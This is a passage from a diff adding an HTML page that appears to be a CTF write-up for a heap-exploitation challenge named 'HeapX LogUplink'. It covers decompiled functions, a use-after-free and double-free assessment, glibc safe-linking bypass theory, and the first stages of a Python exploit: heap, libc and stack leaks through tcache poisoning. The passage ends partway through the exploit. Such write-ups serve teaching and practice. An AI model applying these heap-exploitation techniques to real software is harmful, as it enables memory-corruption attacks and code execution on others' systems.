+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[ERROR] Invalid log number!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>Key Points:</strong></p>
+<ul>
+<li>Index validation: 0 ≤ index &lt; 16</li>
+<li>Uses <code>printf(&quot;%s&quot;, ptr)</code> - treats chunk as string</li>
+<li>No null pointer check after free (UAF vulnerability)</li>
+<li>Stack canary protection enabled</li>
+</ul>
+
+
+<h3 class="relative group">Function 3: Write (<code>write</code>) 
+    <div id="function-3-write-write" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#function-3-write-write" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">write</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span><span class="p">,</span> <span class="kt">int</span> <span class="n">offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_BYTE</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1288</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>  <span class="c1">// Stack canary
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x500uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ptr_table</span><span class="p">[</span><span class="n">index</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="n">size_table</span><span class="p">[</span><span class="n">index</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter log data: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">v3</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size_table</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">memcpy</span><span class="p">((</span><span class="n">offset</span> <span class="o">+</span> <span class="n">ptr_table</span><span class="p">[</span><span class="n">index</span><span class="p">]),</span> <span class="n">buf</span><span class="p">,</span> <span class="n">v3</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[ERROR] Write offset is invalid!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ERROR] Log #%p doesn&#39;t exist!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr_table</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[ERROR] Invalid log number!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v5</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>Key Points:</strong></p>
+<ul>
+<li>Allows writing at specific offset within chunk</li>
+<li>Buffer size: 1288 bytes (0x500)</li>
+<li>Bounds checking on offset</li>
+<li><strong>Information Leak</strong>: Error message reveals ptr_table address</li>
+<li>Copies <code>v3 - 1</code> bytes (one less than read)</li>
+</ul>
+
+
+<h3 class="relative group">Function 4: Delete (<code>delete</code>) 
+    <div id="function-4-delete-delete" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#function-4-delete-delete" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">delete</span><span class="p">(</span><span class="kt">int</span> <span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>  <span class="c1">// Stack canary
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ptr_table</span><span class="p">[</span><span class="n">index</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">free</span><span class="p">(</span><span class="n">ptr_table</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// BUG: Does not set ptr_table[index] = NULL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ERROR] Log #%d doesn&#39;t exist!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[ERROR] Invalid log number!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>CRITICAL VULNERABILITY:</strong></p>
+<ul>
+<li>Calls <code>free()</code> but doesn&rsquo;t nullify pointer</li>
+<li>Creates Use-After-Free (UAF) condition</li>
+<li>Allows access to freed memory through read/write functions</li>
+</ul>
+
+
+<h3 class="relative group">Program Exit Handler 
+    <div id="program-exit-handler" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#program-exit-handler" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">[INFO] Shutting down HeapX LogUplink...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">15</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ptr_table</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">ptr_table</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>  <span class="c1">// Double-free if already freed
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span></code></pre></div><p><strong>Important Notes:</strong></p>
+<ul>
+<li>Loops through all entries and frees them</li>
+<li>Can cause double-free if chunks were already freed</li>
+<li>This behavior is exploitable</li>
+</ul>
+<hr>
+
+
+<h2 class="relative group">🚨 Vulnerability Assessment 
+    <div id="-vulnerability-assessment" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#-vulnerability-assessment" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">Primary Vulnerability: Use-After-Free (UAF) 
+    <div id="primary-vulnerability-use-after-free-uaf" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#primary-vulnerability-use-after-free-uaf" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Root Cause:</strong>
+The <code>delete</code> function calls <code>free()</code> but fails to set the corresponding pointer to NULL.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Vulnerable code in delete function
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">free</span><span class="p">(</span><span class="n">ptr_table</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Missing: ptr_table[index] = NULL;
+</span></span></span></code></pre></div><p><strong>Impact:</strong></p>
+<ol>
+<li><strong>Memory Corruption</strong>: Access to freed memory chunks</li>
+<li><strong>Information Disclosure</strong>: Can read freed chunk contents</li>
+<li><strong>Arbitrary Write</strong>: Can modify freed chunk data</li>
+<li><strong>Control Flow Hijack</strong>: Potential RCE through heap exploitation</li>
+</ol>
+
+
+<h3 class="relative group">Secondary Vulnerabilities 
+    <div id="secondary-vulnerabilities" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#secondary-vulnerabilities" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li>
+<p><strong>Information Leak in Write Function</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ERROR] Log #%p doesn&#39;t exist!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr_table</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">index</span><span class="p">);</span>
+</span></span></code></pre></div><p>Reveals ptr_table address, defeating PIE</p>
+</li>
+<li>
+<p><strong>Double-Free in Exit Handler</strong></p>
+<ul>
+<li>Can trigger double-free conditions</li>
+<li>Potentially exploitable for heap corruption</li>
+</ul>
+</li>
+<li>
+<p><strong>Missing Input Validation</strong></p>
+<ul>
+<li>No comprehensive bounds checking</li>
+<li>Potential integer overflow scenarios</li>
+</ul>
+</li>
+</ol>
+<hr>
+
+
+<h2 class="relative group">🧠 Heap Exploitation Fundamentals 
+    <div id="-heap-exploitation-fundamentals" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#-heap-exploitation-fundamentals" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">Modern Heap Security Features 
+    <div id="modern-heap-security-features" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#modern-heap-security-features" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+
+<h4 class="relative group">1. Safe Linking (glibc ≥ 2.32) 
+    <div id="1-safe-linking-glibc--232" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#1-safe-linking-glibc--232" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>Safe Linking protects forward pointers in freed chunks by XORing them with a key derived from their address.</p>
+<p><strong>Formula:</strong></p>
+<pre tabindex="0"><code>protected_ptr = real_ptr ^ (chunk_addr &gt;&gt; 12)
+</code></pre><p><strong>Purpose:</strong></p>
+<ul>
+<li>Prevents arbitrary chunk allocation</li>
+<li>Makes heap exploitation significantly harder</li>
+<li>Protects against simple tcache/fastbin attacks</li>
+</ul>
+<p><strong>Bypass Strategy:</strong></p>
+<ol>
+<li>Leak heap address to calculate key</li>
+<li>XOR leaked pointer with key to get real address</li>
+<li>XOR target address with key to create valid pointer</li>
+</ol>
+
+
+<h4 class="relative group">2. Tcache (Thread Local Cache) 
+    <div id="2-tcache-thread-local-cache" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#2-tcache-thread-local-cache" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p><strong>Characteristics:</strong></p>
+<ul>
+<li>Per-thread cache for small allocations (≤ 1024 bytes)</li>
+<li>LIFO (Last In, First Out) structure</li>
+<li>Up to 7 chunks per size class</li>
+<li>Minimal security checks compared to other bins</li>
+</ul>
+<p><strong>Exploitation Advantages:</strong></p>
+<ul>
+<li>Easier to manipulate than fastbins</li>
+<li>Fewer consistency checks</li>
+<li>Direct pointer reuse</li>
+</ul>
+
+
+<h4 class="relative group">3. Heap Layout Understanding 
+    <div id="3-heap-layout-understanding" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#3-heap-layout-understanding" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p><strong>Typical Layout:</strong></p>
+<pre tabindex="0"><code>[Heap Base]
+├── Tcache chunks (small sizes)
+├── Fast chunks (if tcache full)
+├── Small chunks
+├── Large chunks
+├── Unsorted bin
+└── [Top Chunk]
+</code></pre><hr>
+
+
+<h2 class="relative group">🎯 Step-by-Step Exploitation 
+    <div id="-step-by-step-exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#-step-by-step-exploitation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">Exploitation Strategy Overview 
+    <div id="exploitation-strategy-overview" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#exploitation-strategy-overview" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Our multi-stage exploitation approach:</p>
+<ol>
+<li><strong>Heap Address Leak</strong> - Bypass Safe Linking</li>
+<li><strong>Libc Address Leak</strong> - Defeat ASLR</li>
+<li><strong>Stack Address Leak</strong> - Locate return address</li>
+<li><strong>PIE Base Leak</strong> - Calculate code addresses</li>
+<li><strong>Memory Manipulation</strong> - Control program flow</li>
+<li><strong>ROP Chain Execution</strong> - Achieve code execution</li>
+</ol>
+
+
+<h3 class="relative group">Stage 1: Heap Address Leak 
+    <div id="stage-1-heap-address-leak" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#stage-1-heap-address-leak" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Objective:</strong> Obtain heap base address to bypass Safe Linking</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Allocation pattern for heap leak</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># First chunk</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># Second chunk</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_C</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x420</span><span class="p">)</span> <span class="c1"># Large chunk (for libc leak later)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_D</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># Fourth chunk</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create tcache chain: chunk_B -&gt; chunk_A</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_C</span><span class="p">)</span>  <span class="c1"># Goes to unsorted bin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Read protected pointer from chunk_B</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Read key from chunk_A</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>  <span class="c1"># Skip first byte</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak2</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak2</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Recover real address</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">^</span> <span class="n">key</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x12b0</span>
+</span></span></code></pre></div><p><strong>Technical Details:</strong></p>
+<ol>
+<li><strong>Tcache Behavior</strong>: When chunks are freed, they form a singly-linked list</li>
+<li><strong>Safe Linking</strong>: Forward pointers are XORed with <code>(chunk_addr &gt;&gt; 12)</code></li>
+<li><strong>Key Extraction</strong>: The key can be extracted from the obfuscated pointer of another chunk</li>
+<li><strong>Address Recovery</strong>: XOR the leaked value with the key to get the real address</li>
+</ol>
+<p><strong>Memory Layout After Frees:</strong></p>
+<pre tabindex="0"><code>chunk_B: [protected_ptr_to_A | ...]
+chunk_A: [protected_null | ...]
+</code></pre>
+
+<h3 class="relative group">Stage 2: Libc Address Leak 
+    <div id="stage-2-libc-address-leak" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#stage-2-libc-address-leak" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Objective:</strong> Defeat ASLR by leaking libc base address</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># chunk_C was freed earlier and went to unsorted bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="p">(</span><span class="n">chunk_C</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak3</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak3</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak3</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Calculate libc base from main_arena</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak3</span> <span class="o">-</span> <span class="mh">0x210b20</span>
+</span></span></code></pre></div><p><strong>Technical Details:</strong></p>
+<ol>
+<li><strong>Unsorted Bin</strong>: Large chunks (≥ 1024 bytes) go here when freed</li>
+<li><strong>Main Arena</strong>: Unsorted bin chunks have fd/bk pointers to main_arena</li>
+<li><strong>Fixed Offset</strong>: main_arena has a known offset from libc base</li>
+<li><strong>Address Calculation</strong>: libc_base = leaked_address - known_offset</li>
+</ol>
+<p><strong>Memory Layout of Freed Large Chunk:</strong></p>
+<pre tabindex="0"><code>chunk_C: [prev_size | size | fd_ptr_to_main_arena | bk_ptr_to_main_arena | ...]
+</code></pre>
+
+<h3 class="relative group">Stage 3: Stack Address Leak 
+    <div id="stage-3-stack-address-leak" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#stage-3-stack-address-leak" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Objective:</strong> Locate stack to find return address</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Use environ pointer to leak stack address</span>
+</span></span><span class="line"><span class="cl"><span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;environ&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Exploit UAF to redirect tcache allocation</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">chunk_D</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">((</span><span class="n">environ</span><span class="o">-</span><span class="mi">24</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_D</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Allocate chunks to get environ chunk</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_F</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_G</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># Points to environ-24</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite and read stack pointer</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;D3L3T357&#39;</span> <span class="o">*</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">chunk_G</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="p">(</span><span class="n">chunk_G</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mh">0x19</span><span class="p">)</span>
